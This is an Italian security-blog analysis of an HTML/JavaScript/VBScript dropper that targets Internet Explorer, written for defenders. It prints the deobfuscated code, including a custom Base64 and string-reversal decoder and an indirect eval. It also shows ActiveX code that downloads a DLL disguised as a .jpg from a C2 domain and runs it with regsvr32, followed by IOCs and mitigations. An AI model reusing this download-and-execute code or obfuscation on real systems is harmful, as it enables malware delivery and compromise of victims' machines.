---
title: Analisi di un dropper HTML/JS per Internet Explorer basato su ActiveX e regsvr32
url: https://blog.lobsec.com/2025/08/analisi-di-un-dropper-html-js-per-internet-explorer-basato-su-activex-e-regsvr32/
source: Over Security - Cybersecurity news aggregator
date: 2025-08-19
fetch_date: 2025-10-07T00:48:05.349976
---

# Analisi di un dropper HTML/JS per Internet Explorer basato su ActiveX e regsvr32

[Vai al contenuto](#content "Vai al contenuto")

[Lobsec](https://blog.lobsec.com/)

Yet another security blog

Menu

Menu

* [CV (ITA)](https://blog.lobsec.com/cv-ita/)
* [Privacy policy](https://blog.lobsec.com/privacy-policy/)

# Analisi di un dropper HTML/JS per Internet Explorer basato su ActiveX e regsvr32

2025-08-18 di [lobst3r](https://blog.lobsec.com/author/lobst3r/ "Visualizza tutti gli articoli di lobst3r")

Della serie *old but gold…*

Negli ultimi anni, il panorama delle minacce si è spostato sempre più verso tecniche di social engineering e sfruttamento di vecchie tecnologie legacy ancora presenti in ambienti enterprise. In questo articolo analizziamo in dettaglio un campione malevolo in formato **file HTML** che contiene **JavaScript** e **VBScript**, progettato per sfruttare **Internet Explorer su Windows**. Lo scopo finale è scaricare un payload mascherato da immagine `.jpg` ed eseguirlo tramite `regsvr32`, abusando della possibilità di caricare librerie DLL con estensioni arbitrarie.

## Panoramica del file

Il file è un documento HTML che a prima vista sembra innocuo: contiene qualche paragrafo (`<p>`) e alcune funzioni JavaScript dai nomi volutamente caotici. In realtà, questi elementi servono a **offuscare** il codice e a impedire una rapida rilevazione da parte di sistemi di difesa basati su firme statiche.

Le tecniche principali sono:

* utilizzo di **decoder Base64 custom** al posto di `atob`
* **string reversing** per rompere pattern noti
* parole chiave sensibili (“eval”) spostate nell’HTML e recuperate in runtime
* combinazione di **JavaScript e VBScript**, pratica ormai deprecata ma ancora sfruttabile in Internet Explorer
* abuso di **ActiveXObject** per accedere al sistema operativo.

## Analisi statica delle funzioni

### Sezione HTML iniziale

```
<p id='notebookI9'>eval</p>
<p id='i9CardCard'>[PAYLOAD_BASE64]---[PAYLOAD_BASE64]</p>
<p id='superComputer'>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</p>
```

* `#notebookI9` contiene la stringa `eval`.
* `#i9CardCard` contiene due blob codificati, separati da `---`.
* `#superComputer` contiene l’alfabeto Base64.

Questi tre elementi sono utilizzati dal decoder JavaScript.

### Decoder Base64 e reverse

```
function notebookCard(encoded) {
    var alphabet = gigabyteComputerNotebook('superComputer');
    var output = "";
    // ... implementazione manuale di Base64 decode ...
    return output;
}

function gigabyteCardAsus(str){
    return str.split('').reverse().join('');
}

function processorMouse(blob){
    return gigabyteCardAsus(notebookCard(blob));
}
```

* `notebookCard` implementa un **decoder Base64 personalizzato**.
* `gigabyteCardAsus` inverte le stringhe.
* `processorMouse` decodifica e poi inverte.

I due payload vengono così ottenuti in chiaro.

### Recupero ed esecuzione dei payload

```
var cardNotebook    = gigabyteComputerNotebook('i9CardCard').split("---");
var centerTable     = processorMouse(cardNotebook[0]); // primo payload
var mouseTableAsus  = processorMouse(cardNotebook[1]); // secondo payload

function computerCardKeyboard(code){
    cardSuperMouse[gigabyteComputerNotebook('notebookI9')](code);
}
```

* `cardNotebook` estrae i due blob Base64 dall’HTML.
* `centerTable` e `mouseTableAsus` diventano i due script in chiaro.
* `computerCardKeyboard` invoca **`eval`** senza scriverlo direttamente, prelevandolo da `#notebookI9`.

### Esecuzione via VBScript

```
<script language='vbscript'>
    Call computerCardKeyboard(centerTable)
    : Call computerCardKeyboard(mouseTableAsus)
</script>
```

Questa sezione è cruciale: **VBScript chiama direttamente la funzione JavaScript** passando come argomento i due payload decodificati. Questa tecnica è specifica di Internet Explorer.

## Payload 1: download del file malevolo

Il primo payload decodificato appare come segue (semplificato per leggibilità):

```
try {
  var xhr = new ActiveXObject("MSXML2.XMLHTTP");
  xhr.open("GET", "http://mcfarlandsquirrelg[.]com/.../payload", false);
  xhr.send();
  if (xhr.status == 200) {
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Open();
    stream.Type = 1;
    stream.Write(xhr.responseBody);
    stream.SaveToFile("C:\\Users\\Public\\keyboardCard.jpg", 2);
    stream.Close();
  }
} catch(e) {}
```

Questo codice:

1. Crea un oggetto `XMLHTTP` per eseguire una richiesta HTTP.
2. Scarica un file binario da un dominio remoto.
3. Usa `ADODB.Stream` per salvare i dati su disco in `C:\Users\Public\keyboardCard.jpg`.

Il file non è un’immagine, bensì una DLL camuffata con estensione `.jpg`.

## Payload 2: esecuzione tramite regsvr32

Il secondo payload decodificato esegue:

```
try {
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("regsvr32 C:\\Users\\Public\\keyboardCard.jpg");
} catch(e) {}
```

Qui il malware sfrutta `regsvr32` per caricare la DLL appena scaricata.
Il trucco consiste nel fatto che `regsvr32` non si basa sull’estensione, ma sul contenuto: se il file è una DLL valida, l’estensione `.jpg` non impedisce l’esecuzione.

## Indicatori di compromissione (IOC)

* **Percorso file droppato:**
  `C:\Users\Public\keyboardCard.jpg`
* **Comando sospetto:**
  `regsvr32 C:\Users\Public\keyboardCard.jpg`
* **Tecniche:**
  + ActiveX (`MSXML2.XMLHTTP`, `ADODB.Stream`, `WScript.Shell`)
  + `VBScript` + `JavaScript`
  + Offuscamento tramite Base64 custom e reverse string
  + Mascheramento DLL in `.jpg`
* **Dominio C2 / download:**
  `mcfarlandsquirrelg[.]com` (con percorsi lunghi e casuali nel querystring).

## Tecniche di evasione

Il dropper utilizza diverse strategie per sfuggire a controlli statici:

* Evitare l’uso diretto di `eval` e `atob`.
* Offuscare i payload con Base64 custom e reverse.
* Spostare la finestra del browser fuori dallo schermo (`moveTo(-101,-102)`) e chiuderla subito dopo l’esecuzione (`window.close()`).
* Uso di nomi variabili confusionari (`gigabyteComputerNotebook`, `mouseTableAsus`).

## Considerazioni di sicurezza

Questa tecnica è un classico esempio di **abuso delle tecnologie legacy** di Windows e Internet Explorer.
Gli elementi chiave sono:

* **ActiveX** come vettore di accesso diretto al filesystem e alle API di Windows.
* **VBScript** come ponte tra HTML e codice nativo.
* **regsvr32** come LOLBin (Living-Off-The-Land Binary) per eseguire DLL malevole.

Nonostante IE e VBScript siano obsoleti, in molte realtà enterprise possono ancora essere presenti per compatibilità con vecchie applicazioni. Questo rende tali attacchi tuttora praticabili.

## Mitigazioni

* **Bloccare Internet Explorer** e disabilitare VBScript tramite GPO.
* **Monitorare l’uso di regsvr32.exe** con EDR/Sysmon, soprattutto quando tenta di eseguire file in cartelle pubbliche o temporanee.
* **Applicare restrizioni tramite AppLocker o WDAC** per limitare l’esecuzione di binari di sistema usati come LOLBins.
* **Analizzare i log HTTP** alla ricerca di connessioni verso domini sospetti (es. `mcfarlandsquirrelg[.]com`).
* **Verificare la presenza di file sospetti** in `C:\Users\Public\` e correlare con i timestamp degli eventi.

## Conclusione

Il campione analizzato dimostra come un semplice file HTML possa fungere da **dropper multi-stadio**, sfruttando componenti legacy di Windows/IE per:

1. Offuscare il codice e bypassare i controlli.
2. Scaricare ed installare un payload binario mascherato.
3. Eseguirlo con strumenti di sistema (regsvr32) senza bisogno di exploit moderni.

Questa tipologia di minaccia sottolinea l’importanza di eliminare tecnologie obsolete dagli ambienti produttivi e di monitorare attentamente l’utilizzo di binari di sistema che possono essere abusati in catene di attacco.

Categorie [analysis](https://blog.lobsec.com/category/analysis/), [blue team](https://blog.lobsec.com/category/blue-team/), [cyber](https://blog.lobsec.com/category/cyber/) Tag [activex](https://blog.lobsec.com/tag/activex/), [cybersecurity](https://blog.lobsec.com/tag/cybersecurity/), [droppler](https://blog.lobsec.com/tag/droppl...